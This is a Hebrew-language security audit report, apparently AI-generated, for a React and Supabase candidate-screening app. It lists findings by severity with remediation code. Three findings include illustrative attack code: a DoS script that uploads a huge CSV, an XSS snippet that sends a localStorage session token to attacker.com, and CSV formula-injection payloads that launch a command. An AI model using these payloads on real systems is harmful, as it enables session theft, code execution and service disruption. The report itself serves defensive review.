# דוח ביקורת אבטחת מידע - Scaler AI Engine

**תאריך הביקורת:** 6 בנובמבר 2025
**גרסת המערכת:** v0.0.0
**סוג הביקורת:** ביקורת אבטחה מקיפה (Comprehensive Security Audit)

---

## תקציר מנהלים (Executive Summary)

בוצעה ביקורת אבטחה מקיפה למערכת Scaler AI Engine, פלטפורמת סינון מועמדים מבוססת AI. המערכת בנויה על React 18 עם TypeScript, Vite, ו-Supabase כ-Backend-as-a-Service.

### ממצאים עיקריים:

**סטטוס כללי:** ⚠️ דרוש שיפור - נמצאו מספר פגיעויות אבטחה בדרגות חומרה שונות

**רמות סיכון שזוהו:**
- 🔴 **קריטי (Critical):** 0 פגיעויות
- 🟠 **גבוה (High):** 3 פגיעויות
- 🟡 **בינוני (Medium):** 6 פגיעויות
- 🟢 **נמוך (Low):** 8 פגיעויות

---

## 1. ממצאי אבטחה - לפי דרגת חומרה

### 🔴 פגיעויות קריטיות (Critical) - 0

לא נמצאו פגיעויות קריטיות.

---

### 🟠 פגיעויות בחומרה גבוהה (High) - 3

#### H-1: העדר הצפנת נתונים רגישים במנוחה (Data at Rest)
**מיקום:** `/src/integrations/supabase/types.ts`, כל טבלאות המסד
**תיאור:** נתוני PII (Personally Identifiable Information) מאוחסנים בטקסט גלוי ללא הצפנה:
- שמות מלאים של מועמדים
- כתובות LinkedIn
- פרופילים מקצועיים מלאים
- היסטוריית עבודה

**סיכון:**
- במקרה של פריצה למסד הנתונים, כל המידע הרגיש חשוף
- אין אפשרות למחיקה מאובטחת (crypto-shredding)
- חוסר עמידה בתקני GDPR לגבי הגנת מידע אישי

**המלצה:**
```javascript
// יישום הצפנה ברמת השדה (Field-level encryption)
1. שימוש ב-Supabase Vault או הצפנה ברמת האפליקציה
2. הצפנת שדות: full_name, linkedin_url, profile_summary
3. שימוש ב-AES-256-GCM עם ניהול מפתחות נכון
```

**עדיפות:** HIGH - יש לטפל בתוך 30 יום

---

#### H-2: חוסר Rate Limiting ומגבלות גודל קובץ
**מיקום:** `/src/components/FileUpload.tsx:269-279`
**קוד פגיע:**
```typescript
if (!file.name.toLowerCase().endsWith('.csv')) {
  // רק בדיקת סיומת - אין בדיקת גודל!
  toast({ title: "Invalid File Type", ... });
  return;
}
```

**סיכון:**
- תוקף יכול להעלות קובץ CSV בגודל עצום (GB) → DoS attack
- העלאת קבצים מרובים במקביל → דריסת שרת
- צריכת משאבי CPU/Memory ללא הגבלה בעת parsing

**קוד ניצול אפשרי:**
```python
# DoS Attack - העלאת קובץ 5GB
import requests
with open('huge_file.csv', 'w') as f:
    for i in range(100000000):  # 100M שורות
        f.write(f"name{i},title{i},company{i}\n")
requests.post(UPLOAD_URL, files={'file': open('huge_file.csv')})
```

**המלצה:**
```typescript
// הוספת מגבלת גודל ב-FileUpload.tsx
const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB
if (file.size > MAX_FILE_SIZE) {
  toast({
    title: "File Too Large",
    description: `Maximum file size is 50MB. Your file is ${(file.size / 1024 / 1024).toFixed(2)}MB`,
    variant: "destructive"
  });
  return;
}
```

**עדיפות:** HIGH - יש לטפל בתוך 14 יום

---

#### H-3: אחסון Session ב-localStorage (XSS Vulnerability)
**מיקום:** `/src/integrations/supabase/client.ts:11-16`
**קוד פגיע:**
```typescript
export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    storage: localStorage,  // ❌ חשוף ל-XSS
    persistSession: true,
    autoRefreshToken: true,
  }
});
```

**סיכון:**
- מתקפת XSS יכולה לגנוב את ה-session token מ-localStorage
- Token נשאר גלוי ב-DevTools
- אין הגנה מפני CSRF attacks

**וקטור תקיפה:**
```javascript
// XSS Attack - גניבת session
<script>
  const session = localStorage.getItem('supabase.auth.token');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: session })
  });
</script>
```

**המלצה:**
```typescript
// שימוש ב-httpOnly cookies במקום localStorage
// אופציה 1: שימוש ב-Supabase Edge Functions עם cookies
// אופציה 2: proxy server שמטפל ב-authentication
auth: {
  storage: customSecureStorage, // custom implementation with httpOnly
  persistSession: true,
  autoRefreshToken: true,
}
```

**עדיפות:** HIGH - יש לטפל בתוך 30 יום

---

### 🟡 פגיעויות בחומרה בינונית (Medium) - 6

#### M-1: Admin Impersonation ללא MFA
**מיקום:** `/src/hooks/useAdminImpersonation.tsx:64-78`
**תיאור:** מנהלים יכולים להתחזות למשתמשים אחרים ללא אימות דו-שלבי

**סיכון:**
- אם חשבון מנהל נפרץ → גישה לכל נתוני המשתמשים
- אין אתגר נוסף לפעולות רגישות
- רק audit log (ניתן למחיקה ע"י המנהל עצמו)

**המלצה:**
1. הוספת MFA חובה לחשבונות admin
2. דרישת re-authentication לפני impersonation
3. הגבלת זמן ה-impersonation (timeout אחרי 30 דקות)

**עדיפות:** MEDIUM

---

#### M-2: CSV Injection (Formula Injection)
**מיקום:** `/src/components/FileUpload.tsx:120-199`, `/src/pages/Results.tsx` (export)

**קוד פגיע:**
```typescript
const rawDataRecords = data.map((row, index) => {
  // אין sanitization של תווים מיוחדים כמו =, +, -, @
  const firstName = getField(row, ['firstName', ...]);
  return {
    full_name: fullName,  // ❌ יכול להכיל =SUM(A1:A10)
    current_title: currentTitle,  // ❌ יכול להכיל +cmd|'/c calc'!A1
  };
});
```

**סיכון:**
- מועמד זדוני יכול להכניס נוסחאות Excel בשדות CSV
- בעת ייצוא התוצאות, Excel יריץ את הנוסחאות
- אפשרות להרצת קוד על מחשב המגייס

**קוד ניצול:**
```csv
full_name,current_title,company
=1+1,Software Engineer,Google
=cmd|'/c calc'|A1,Developer,Microsoft
@SUM(1+1),Analyst,Amazon
```

**המלצה:**
```typescript
// sanitization function
const sanitizeForCSV = (value: string): string => {
  if (!value) return '';
  // הסרת תווים מסוכנים בתחילת המחרוזת
  if (/^[=+\-@]/.test(value)) {
    return `'${value}`; // הוספת apostrophe למניעת הרצה
  }
  return value;
};
```

**עדיפות:** MEDIUM

---

#### M-3: חוסר אימות אורך שדות (No Input Length Validation)
**מיקום:** כל הטבלאות - אין CONSTRAINT על אורך שדות TEXT

**סיכון:**
- תוקף יכול להכניס string באורך GB → מילוי דיסק
- שדות ללא הגבלה גורמים לבעיות ביצועים
- אפשרות ל-DoS באמצעות strings ארוכים מאוד

**המלצה:**
```sql
-- הוספת מגבלות אורך בטבלאות
ALTER TABLE raw_data
  ALTER COLUMN full_name TYPE VARCHAR(200),
  ALTER COLUMN current_title TYPE VARCHAR(300),
  ALTER COLUMN linkedin_url TYPE VARCHAR(500),
  ALTER COLUMN profile_summary TYPE VARCHAR(5000);
```

**עדיפות:** MEDIUM

---

#### M-4: TypeScript Compiler Configuration - חוסר Strict Mode
**מיקום:** `/tsconfig.json:9-14`

**הגדרות פגיעות:**
```json
{
  "noImplicitAny": false,        // ❌ מאפשר any ללא הצהרה
  "strictNullChecks": false,     // ❌ מאפשר null/undefined בכל מקום
  "noUnusedParameters": false,   // ❌ קוד מת לא מזוהה
  "noUnusedLocals": false        // ❌ משתנים לא בשימוש
}
```

**סיכון:**
- הסתרת bugs פוטנציאליים
- null reference errors בזמן ריצה
- קוד לא מתוחזק נשאר במערכת

**המלצה:**
```json
{
  "strict": true,
  "noImplicitAny": true,
  "strictNullChecks": true,
  "noUnusedParameters": true,
  "noUnusedLocals": true
}
```

**עדיפות:** MEDIUM

---

#### M-5: חשיפת Console Logs עם נתונים רגישים
**מיקום:** 83 מופעים ב-17 קבצים

**דוגמאות:**
```typescript
// FileUpload.tsx:116
console.log('Transforming data for database...');
// ProcessFilter.tsx:319
console.log(`Found ${candidates.length} candidates and filter rules:`, filterRules);
// useAuth.tsx:64
console.error('Error handling profile:', error);
```

**סיכון:**
- לוגים עשויים להכיל PII
- לוגים נשארים ב-production builds
- מידע רגיש נחשף ב-browser console

**המלצה:**
```typescript
// שימוש ב-wrapper לוגים
const logger = {
  log: process.env.NODE_ENV === 'development' ? console.log : () => {},
  error: (msg: string, err?: any) => {
    // שליחה ל-error tracking service (Sentry)
    if (process.env.NODE_ENV === 'production') {
      // sanitize error before sending
    }
  }
};
```

**עדיפות:** MEDIUM

---

#### M-6: פגיעויות בתלויות (Dependency Vulnerabilities)
**מיקום:** `package.json`, תוצאות `npm audit`

**פגיעויות שזוהו:**
```
1. esbuild <= 0.24.2 (MODERATE)
   CVE: GHSA-67mh-4wv8-2f99
   תיאור: esbuild מאפשר לאתרים לשלוח בקשות לשרת פיתוח
   CVSS: 5.3

2. vite <= 6.1.6 (LOW-MODERATE)
   - GHSA-g4jq-h2w9-997c: מידלוור עשוי להגיש קבצים שמתחילים באותו שם
   - GHSA-jqfw-vq24-v9c3: הגדרות server.fs לא הוחלו על HTML
   - GHSA-93m4-6634-74q7: bypass של server.fs.deny דרך backslash ב-Windows
```

**המלצה:**
```bash
# עדכון תלויות
npm update vite@latest
npm update esbuild@latest
npm audit fix
```

**עדיפות:** MEDIUM

---

### 🟢 פגיעויות בחומרה נמוכה (Low) - 8

#### L-1: Hardcoded Redirect URL
**מיקום:** `/src/hooks/useAuth.tsx:84-86`
```typescript
const redirectUrl = window.location.hostname === 'localhost'
  ? 'https://fe15e92e-7210-4079-a610-155d2fdbb2ff.lovableproject.com/'
  : `${window.location.origin}/`;
```
**המלצה:** שימוש במשתנה סביבה `VITE_REDIRECT_URL`

---

#### L-2: חוסר CSRF Protection
**תיאור:** אין הגנת CSRF tokens בפעולות state-changing
**המלצה:** הוספת CSRF tokens לפעולות מסוכנות

---

#### L-3: חוסר Security Headers
**תיאור:** לא מוגדרים headers אבטחה:
- `Content-Security-Policy`
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Strict-Transport-Security`

**המלצה:**
```typescript
// vite.config.ts
export default defineConfig({
  server: {
    headers: {
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      'Content-Security-Policy': "default-src 'self'; ..."
    }
  }
})
```

---

#### L-4: חוסר מדיניות שמירת נתונים (Data Retention Policy)
**תיאור:** אין מחיקה אוטומטית של נתונים ישנים
**המלצה:** יישום GDPR compliance עם מחיקה אחרי שנה

---

#### L-5: חוסר Audit Logging מקיף
**תיאור:** רק impersonation נרשם, פעולות אחרות לא
**המלצה:** הוספת לוגים לפעולות: עדכון filter rules, מחיקת מועמדים, ייצוא נתונים

---

#### L-6: חוסר Input Sanitization ב-Logic Parser
**מיקום:** `/src/lib/logicParser.ts:15-38`
**תיאור:** פרסור לוגיקת AND/OR ללא הגבלת עומק
**המלצה:** הגבלת עומק קינון למניעת ReDoS

---

#### L-7: Email Validation חלש
**מיקום:** `/src/pages/Auth.tsx:12-14`
**המלצה:** שימוש בספרייה מקצועית כמו `validator.js`

---

#### L-8: חוסר Timeout על API Calls
**מיקום:** `/src/pages/ProcessFilter.tsx:588`
**תיאור:** רק timeout של 20 שניות על batch processing
**המלצה:** timeout על כל קריאת Supabase

---

## 2. ממצאי אבטחה חיוביים ✅

### מה עובד טוב:

1. **Row Level Security (RLS) מוגדר נכון**
   - כל הטבלאות מוגנות ע"י RLS
   - Users יכולים לגשת רק לנתונים שלהם
   - Admin policies מוגדרים נכון

2. **הגנה מפני SQL Injection**
   - שימוש ב-Supabase SDK עם parameterized queries
   - אין קונקטנציה ידנית של SQL

3. **הגנה מפני Command Injection**
   - אין הרצת פקודות shell במערכת
   - כל העיבוד client-side או דרך Supabase

4. **Authentication תקין**
   - שימוש ב-Supabase Auth עם email verification
   - Password hashing מטופל ע"י Supabase

5. **Audit Logging על Impersonation**
   - כל פעולה נרשמת ב-`admin_audit_log`

6. **Data Validation עם Zod**
   - שימוש בספרייה מקצועית לvalidation

7. **HTTPS Enforced**
   - כל התקשורת מוצפנת

8. **Publishable Keys חשופים כמתוכנן**
   - Supabase keys מיועדים להיות ציבוריים
   - ההגנה דרך RLS

---

## 3. סיכום והמלצות - פעולות מיידיות

### פעולות קריטיות (תוך 14 יום):

1. **הוספת מגבלת גודל קובץ** (H-2)
   - קובץ: `FileUpload.tsx`
   - מגבלה: 50MB
   - זמן יישום: 1 שעה

2. **הוספת Rate Limiting**
   - שימוש ב-Supabase Edge Functions עם rate limiting
   - זמן יישום: 4 שעות

### פעולות בעדיפות גבוהה (תוך 30 יום):

3. **הצפנת שדות רגישים** (H-1)
   - שימוש ב-Supabase Vault
   - זמן יישום: 16 שעות

4. **מעבר מ-localStorage ל-httpOnly cookies** (H-3)
   - זמן יישום: 8 שעות

5. **הוספת MFA לאדמינים** (M-1)
   - שימוש ב-Supabase Auth MFA
   - זמן יישום: 4 שעות

### פעולות בעדיפות בינונית (תוך 60 יום):

6. **CSV Injection Protection** (M-2)
7. **TypeScript Strict Mode** (M-4)
8. **עדכון תלויות** (M-6)
9. **הגבלת אורך שדות** (M-3)

### פעולות ארוכות טווח (תוך 90 יום):

10. **Security Headers**
11. **GDPR Compliance**
12. **Comprehensive Audit Logging**

---

## 4. מטריצת סיכונים (Risk Matrix)

| פגיעות | סבירות | השפעה | סיכון כולל | עדיפות |
|--------|--------|-------|------------|---------|
| H-1: אין הצפנה | בינונית | גבוהה | גבוה | 🔴 1 |
| H-2: DoS בהעלאה | גבוהה | בינונית | גבוה | 🔴 2 |
| H-3: XSS Session | בינונית | גבוהה | גבוה | 🔴 3 |
| M-1: Admin MFA | נמוכה | גבוהה | בינוני | 🟡 4 |
| M-2: CSV Injection | בינונית | בינונית | בינוני | 🟡 5 |
| M-3: Input Length | גבוהה | נמוכה | בינוני | 🟡 6 |

---

## 5. תוכנית פעולה מומלצת (Action Plan)

### שבוע 1-2:
- [ ] הוספת בדיקת גודל קובץ (MAX 50MB)
- [ ] הוספת rate limiting על uploads
- [ ] עדכון כל התלויות (`npm update`)

### שבוע 3-4:
- [ ] הפעלת TypeScript strict mode
- [ ] הוספת sanitization ל-CSV export
- [ ] הוספת security headers

### חודש 2:
- [ ] יישום הצפנת שדות רגישים
- [ ] הוספת MFA לאדמינים
- [ ] מעבר ל-httpOnly cookies

### חודש 3:
- [ ] הוספת GDPR compliance
- [ ] יישום data retention policy
- [ ] comprehensive audit logging

---

## 6. כלים מומלצים לניטור אבטחה

1. **Snyk** - סריקת תלויות אוטומטית
2. **Sentry** - error tracking ו-logging מאובטח
3. **OWASP ZAP** - penetration testing
4. **SonarQube** - ניתוח קוד סטטי
5. **npm audit** - בדיקות security שוטפות

---

## 7. מסקנות

**ציון אבטחה כללי:** 6.5/10 (מספק אך דורש שיפורים)

המערכת **בטוחה יחסית** בזכות:
- שימוש ב-Supabase עם RLS
- אין פגיעויות SQL injection
- Authentication תקין

אך **דורשת תיקונים** ב:
- הצפנת נתונים רגישים
- Rate limiting ומגבלות קלט
- אבטחת session tokens
- עדכון תלויות

**המלצה:** לטפל בפגיעויות בעדיפות HIGH תוך 30 יום למניעת סיכוני אבטחה משמעותיים.

---

**מבצע הביקורת:** Claude Code Security Audit
**תאריך:** 6 בנובמבר 2025
**גרסה:** 1.0
